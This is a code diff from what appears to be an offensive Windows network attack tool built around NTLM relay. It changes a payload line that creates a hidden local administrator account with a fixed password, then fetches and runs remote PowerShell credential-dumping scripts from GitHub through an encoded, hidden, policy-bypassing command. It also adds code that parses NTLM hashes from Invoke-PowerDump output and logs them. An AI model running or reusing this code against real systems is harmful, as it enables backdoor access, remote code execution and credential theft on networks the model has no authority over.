@@ -965,7 +965,7 @@ def run_relay_attack(iface, args):
     elif args.auto:
         remote_cmd = run_empire_deathstar(iface, args)
     else:
-        text_cmd = "net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Obf-Cats/master/Obf-Cats.ps1'); Obf-Cats -pwds"
+        text_cmd = "net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Invoke-Cats/master/Invoke-Cats.ps1'); Invoke-Cats -pwds; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Invoke-Pwds/master/Invoke-Pwds.ps1'); Invoke-Pwds"
         enc_cmd = encode_for_ps(text_cmd)
         remote_cmd = 'powershell -nop -exec bypass -w hidden -enc {}'.format(enc_cmd)
 
@@ -1029,6 +1029,21 @@ def format_mimi_data(dom, user, auth, hash_or_pw, prev_creds):
         if duplicate == False:
             print_great('{} found! {}'.format(hash_or_pw, dom_user_pwd))
             log_pwds([dom_user_pwd])
+
+    return prev_creds
+
+def parse_invoke_powerdump(prev_creds, line):
+    line = line.strip()
+    if line.count(':') == 6:
+        if line[-3:] == ':::':
+            split_line = line.split(':')
+            user = split_line[0]
+            ntlm_hash = split_line[3]
+            hash_or_pw = 'Hash'
+            user_pwd = user+':'+ntlm_hash
+            print_great('{} found! {}'.format(hash_or_pw, user_pwd))
+            prev_creds.append(user_pwd)
+            log_pwds([user_pwd])
 
     return prev_creds
 
@@ -1273,6 +1288,10 @@ def do_ntlmrelay(prev_creds, args, iface):
     for line in file_lines:
         # Parse ntlmrelay output
         prev_creds, successful_auth = parse_ntlmrelay_line(line, successful_auth, prev_creds, args)
+
+        # Parse Invoke-PowerDump output
+        prev_creds = parse_invoke_powerdump(prev_creds, line)
+
         # Parse mimikatz output
         prev_creds, mimi_data = parse_mimikatz(prev_creds, mimi_data, line)
 
